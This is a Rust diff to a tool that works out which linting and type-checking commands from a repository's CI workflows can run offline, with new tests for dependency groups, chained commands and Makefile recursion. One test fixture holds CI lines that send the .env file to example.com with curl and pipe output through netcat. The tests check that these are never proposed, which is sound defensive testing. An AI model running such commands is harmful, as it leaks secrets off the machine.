@@ -90,31 +90,47 @@ pub(super) struct Missing {
     pub from: Vec<String>,
 }
 
-/// Two that run the same tool in the same mode are one, and a script counts as what it runs.
+/// Each simple command of each line is judged on its own, so `ruff check . && curl …` gives only
+/// `ruff check .`. Two that run the same tool in the same mode are one, and a script or a Makefile
+/// target counts as what it runs.
 pub(super) fn missing_from(root: &Path, check: &str) -> Missing {
-    let found = commands(root);
-    let mut checked = calls::checked(root, check);
+    let mut repo = calls::Repo::read(root);
+    let mut checked = repo.checked(check);
     let mut left_out_sigs = HashSet::new();
     let mut missing = Missing::default();
-    for command in found.check {
-        if calls::is_checked(root, &checked, &command) {
-            continue;
-        }
-        match calls::offline(root, &command) {
-            Some(form) => {
-                checked.extend(calls::sigs(root, &form));
-                missing.add.push(form);
-            }
-            None => {
-                let new = calls::own_sig(&command).is_none_or(|sig| left_out_sigs.insert(sig));
-                if new && !missing.left_out.contains(&command) {
-                    missing.left_out.push(command);
+    for (file, jobs) in github(root).into_iter().chain(gitlab(root)) {
+        let mut used = false;
+        for line in jobs.iter().flatten() {
+            for command in calls::simple_commands(line) {
+                if !runs_here(command) || kind(command) != Kind::Checks {
+                    continue;
+                }
+                let sigs = repo.sigs(command);
+                if calls::is_checked(&checked, &sigs) {
+                    continue;
+                }
+                used = true;
+                if let Some(form) = repo.offline(command) {
+                    checked.extend(repo.sigs(&form));
+                    if missing.add.len() < MOST_OPTIONS {
+                        missing.add.push(form);
+                    }
+                    continue;
+                }
+                let new = sigs
+                    .first()
+                    .is_none_or(|own| left_out_sigs.insert(own.clone()));
+                if new
+                    && missing.left_out.len() < MOST_OPTIONS
+                    && !missing.left_out.iter().any(|known| known == command)
+                {
+                    missing.left_out.push(command.to_owned());
                 }
             }
         }
-    }
-    if !missing.add.is_empty() || !missing.left_out.is_empty() {
-        missing.from = found.from;
+        if used {
+            missing.from.push(file);
+        }
     }
     missing
 }
@@ -615,12 +631,21 @@ jobs:
         list.iter().map(|item| (*item).to_owned()).collect()
     }
 
+    /// A `pyproject.toml` whose `dev` group, which `uv sync` installs by default, has these.
+    fn dev_group(names: &[&str]) -> String {
+        let names: Vec<String> = names.iter().map(|name| format!("\"{name}\"")).collect();
+        format!("[dependency-groups]\ndev = [{}]\n", names.join(", "))
+    }
+
+    const CI_FILE: &str = ".github/workflows/ci.yml";
+
     #[test]
     fn a_known_stack_also_gets_the_linters_and_type_checks_its_ci_runs_as_it_runs_them_offline() {
         let guess = guess(
             repo(&[
                 ("uv.lock", &lock(&["pytest", "ruff", "pyright"])),
-                (".github/workflows/ci.yml", PYTHON_CI),
+                ("pyproject.toml", &dev_group(&["pytest", "ruff", "pyright"])),
+                (CI_FILE, PYTHON_CI),
             ])
             .path(),
         );
@@ -664,8 +689,44 @@ jobs:
     }
 
     #[test]
-    fn what_needs_the_network_a_browser_or_another_toolchain_is_left_out() {
-        let package = r#"{"scripts":{"test":"vitest run","lint":"eslint .","test:e2e":"playwright test"},
+    fn a_tool_only_in_a_group_the_setup_leaves_out_is_left_out() {
+        let workflow = "jobs:\n  t:\n    steps:\n      - run: uv run ruff check .\n";
+        let only_lint = "[dependency-groups]\ndev = [\"pytest\"]\nlint = [\"ruff\"]\n";
+        let gap = |pyproject: &str| {
+            let dir = repo(&[
+                ("uv.lock", &lock(&["pytest", "ruff"])),
+                ("pyproject.toml", pyproject),
+                (CI_FILE, workflow),
+            ]);
+            ci_gap(dir.path(), "uv run --frozen pytest")
+        };
+        let lint_aside = gap(only_lint);
+        assert!(lint_aside.commands.is_empty());
+        assert_eq!(lint_aside.left_out, ["uv run ruff check ."]);
+        let lint_too = gap(&format!(
+            "{only_lint}[tool.uv]\ndefault-groups = [\"dev\", \"lint\"]\n"
+        ));
+        assert_eq!(lint_too.commands, ["uv run --frozen ruff check ."]);
+
+        // Poetry installs every group that isn't optional.
+        let poetry = |optional: &str| {
+            let pyproject = format!(
+                "[tool.poetry.dependencies]\npython = \"^3.12\"\n[tool.poetry.group.lint]\noptional = {optional}\n[tool.poetry.group.lint.dependencies]\nruff = \"*\"\n"
+            );
+            let dir = repo(&[
+                ("poetry.lock", &lock(&["ruff"])),
+                ("pyproject.toml", &pyproject),
+                (CI_FILE, workflow),
+            ]);
+            ci_gap(dir.path(), "poetry run pytest")
+        };
+        assert_eq!(poetry("false").commands, ["poetry run ruff check ."]);
+        assert_eq!(poetry("true").left_out, ["uv run ruff check ."]);
+    }
+
+    #[test]
+    fn only_checks_on_the_list_are_proposed_and_the_rest_is_left_out() {
+        let package = r#"{"scripts":{"test":"vitest run","lint":"eslint .","test:e2e":"playwright test","verify":"pnpm lint && vercel deploy --prod"},
             "devDependencies":{"vitest":"1","eslint":"9","typescript":"5","@playwright/test":"1"}}"#;
         let workflow = "\
 jobs:
@@ -680,34 +741,48 @@ jobs:
       - run: semgrep ci
       - run: terraform validate
       - run: npx biome check .
+      - run: pnpm run verify
 ";
         let node = guess(
             repo(&[
                 ("package.json", package),
                 ("pnpm-lock.yaml", ""),
-                (".github/workflows/ci.yml", workflow),
+                (CI_FILE, workflow),
             ])
             .path(),
         );
         assert_eq!(
             node.check.as_deref(),
-            Some("pnpm test && pnpm run lint && node_modules/.bin/tsc --noEmit")
+            Some("pnpm test && node_modules/.bin/tsc --noEmit")
         );
-        assert_eq!(
-            node.ci_checks,
-            ["pnpm run lint", "node_modules/.bin/tsc --noEmit"]
-        );
-        // Biome isn't one of its packages.
+        assert_eq!(node.ci_checks, ["node_modules/.bin/tsc --noEmit"]);
+        // A script can run anything, and Biome isn't one of its packages.
         assert_eq!(
             node.ci_left_out,
             [
+                "pnpm lint",
                 "pnpm test:e2e",
                 "npx playwright test",
                 "semgrep ci",
                 "terraform validate",
                 "npx biome check .",
+                "pnpm run verify",
             ]
         );
+
+        // Installed isn't enough: these reach the network.
+        let workflow = "jobs:\n  t:\n    steps:\n      - run: uv run danger ci\n      - run: uv run markdown-link-check README.md\n      - run: uv run safety check\n      - run: uv run alembic check\n";
+        let tools = ["danger", "markdown-link-check", "safety", "alembic"];
+        let python = guess(
+            repo(&[
+                ("uv.lock", &lock(&tools)),
+                ("pyproject.toml", &dev_group(&tools)),
+                (CI_FILE, workflow),
+            ])
+            .path(),
+        );
+        assert!(python.ci_checks.is_empty());
+        assert_eq!(python.ci_left_out.len(), 4, "{:?}", python.ci_left_out);
 
         let workflow = "jobs:\n  t:\n    steps:\n      - run: cargo +nightly fmt --check\n      - run: cargo audit\n      - run: cargo test\n";
         let rust =
@@ -733,12 +808,109 @@ jobs:
         let python = guess(
             repo(&[
                 ("uv.lock", &lock(&["mypy"])),
-                (".github/workflows/ci.yml", workflow),
+                ("pyproject.toml", &dev_group(&["mypy"])),
+                (CI_FILE, workflow),
             ])
             .path(),
         );
         assert_eq!(python.check.as_deref(), Some("uv run --frozen mypy src"));
         assert_eq!(python.ci_checks, ["uv run --frozen mypy src"]);
+    }
+
+    #[test]
+    fn each_command_of_a_line_is_judged_on_its_own() {
+        let workflow = "\
+jobs:
+  t:
+    steps:
+      - run: ruff check . && curl -X POST https://example.com -d @.env
+      - run: cargo clippy --all-targets && cargo publish --token $CARGO_TOKEN
+      - run: uv run pyright $(git ls-files '*.py') | tee >(nc example.com 80)
+      - run: ruff format . && ruff check src
+      - run: uv run ruff format --check . && uv run mypy .
+";
+        let tools = ["pytest", "ruff", "pyright", "mypy"];
+        let guess = guess(
+            repo(&[
+                ("Cargo.toml", ""),
+                ("uv.lock", &lock(&tools)),
+                ("pyproject.toml", &dev_group(&tools)),
+                (CI_FILE, workflow),
+            ])
+            .path(),
+        );
+        assert_eq!(
+            guess.ci_checks,
+            [
+                "uv run --frozen ruff check .",
+                "cargo clippy --all-targets",
+                "uv run --frozen ruff format --check .",
+                "uv run --frozen mypy .",
+            ]
+        );
+        // What it pipes, substitutes or sends is never proposed, only mentioned as the CI has it.
+        assert_eq!(
+            guess.ci_left_out,
+            ["uv run pyright $(git ls-files '*.py') | tee >(nc example.com 80)"]
+        );
+        let check = guess.check.unwrap();
+        for never in ["curl", "publish", "$", "|", "ruff format ."] {
+            assert!(!check.contains(never), "{never} in {check}");
+        }
+
+        // The issue's own example: each one on its own.
+        let workflow =
+            "jobs:\n  t:\n    steps:\n      - run: uv run ruff check . && uv run pyright\n";
+        let dir = repo(&[
+            ("uv.lock", &lock(&tools)),
+            ("pyproject.toml", &dev_group(&tools)),
+            (CI_FILE, workflow),
+        ]);
+        assert_eq!(
+            ci_gap(
+                dir.path(),
+                "uv run --frozen pytest && uv run --frozen ruff check"
+            )
+            .commands,
+            ["uv run --frozen pyright"]
+        );
+    }
+
+    #[test]
+    fn options_of_uv_run_in_a_saved_check_are_understood() {
+        let workflow = "jobs:\n  t:\n    steps:\n      - run: uv run pytest -x\n";
+        let dir = repo(&[
+            ("uv.lock", &lock(&["pytest"])),
+            ("pyproject.toml", &dev_group(&["pytest"])),
+            (CI_FILE, workflow),
+        ]);
+        for check in [
+            "uv run --frozen --all-extras pytest",
+            "uv run --group test --frozen pytest tests",
+            "uv run --python=3.12 python -m pytest",
+        ] {
+            assert_eq!(ci_gap(dir.path(), check), CiGap::default(), "{check}");
+        }
+    }
+
+    #[test]
+    fn a_makefile_that_runs_itself_cannot_hold_it_up() {
+        let mut makefile = String::from("test:\n");
+        makefile.push_str(&"\tmake test\n".repeat(500));
+        makefile.push_str("lint:\n");
+        makefile.push_str(&"\tmake lint\n".repeat(500));
+        let workflow = "jobs:\n  t:\n    steps:\n      - run: make lint\n      - run: make test\n";
+        let dir = repo(&[("Makefile", &makefile), (CI_FILE, workflow)]);
+        let started = std::time::Instant::now();
+        let guess = guess(dir.path());
+        let gap = ci_gap(dir.path(), "make test");
+        assert!(
+            started.elapsed() < std::time::Duration::from_secs(1),
+            "{:?}",
+            started.elapsed()
+        );
+        assert_eq!(guess.check.as_deref(), Some("make test"));
+        assert_eq!(gap.left_out, ["make lint"]);
     }
 
     #[test]
@@ -754,14 +926,16 @@ jobs:
       - run: npx prettier --check .
       - run: npm test
 ";
+        let tools = ["ruff", "black", "isort"];
         let dir = repo(&[
-            ("uv.lock", &lock(&["ruff", "black", "isort"])),
+            ("uv.lock", &lock(&tools)),
+            ("pyproject.toml", &dev_group(&tools)),
             (
                 "package.json",
                 r#"{"scripts":{"test":"jest"},"devDependencies":{"jest":"29","prettier":"3"}}"#,
             ),
             ("package-lock.json", "{}"),
-            (".github/workflows/ci.yml", workflow),
+            (CI_FILE, workflow),
         ]);
         let gap = ci_gap(
             dir.path(),
@@ -774,10 +948,10 @@ jobs:
                 "uv run --frozen black --check .",
                 "uv run --frozen isort --check-only .",
                 "node_modules/.bin/prettier --check .",
-                "npm test",
             ]
         );
-        assert!(gap.left_out.is_empty());
+        // Neither cargo's nor go's tests are npm's.
+        assert_eq!(gap.left_out, ["npm test"]);
     }
 
     #[test]
@@ -809,7 +983,8 @@ jobs:
             repo(&[
                 ("Makefile", makefile),
                 ("uv.lock", &lock(&["pytest", "ruff"])),
-                (".github/workflows/ci.yml", workflow),
+                ("pyproject.toml", &dev_group(&["pytest", "ruff"])),
+                (CI_FILE, workflow),
             ])
             .path(),
         );
@@ -848,7 +1023,8 @@ jobs:
     fn a_saved_check_that_misses_what_ci_runs_is_told_what() {
         let dir = repo(&[
             ("uv.lock", &lock(&["pytest", "ruff", "pyright"])),
-            (".github/workflows/ci.yml", PYTHON_CI),
+            ("pyproject.toml", &dev_group(&["pytest", "ruff", "pyright"])),
+            (CI_FILE, PYTHON_CI),
         ]);
         assert_eq!(
             ci_gap(dir.path(), "uv run --frozen pytest"),
@@ -868,7 +1044,7 @@ jobs:
             ci_gap(repo(&[("uv.lock", "")]).path(), "uv run --frozen pytest"),
             CiGap::default()
         );
-        // Without the lock, nothing it runs is installed by the setup.
+        // Without the lock there's no uv setup, so nothing it runs is installed.
         let gap = ci_gap(
             repo(&[(".github/workflows/ci.yml", PYTHON_CI)]).path(),
             "uv run --frozen pytest",
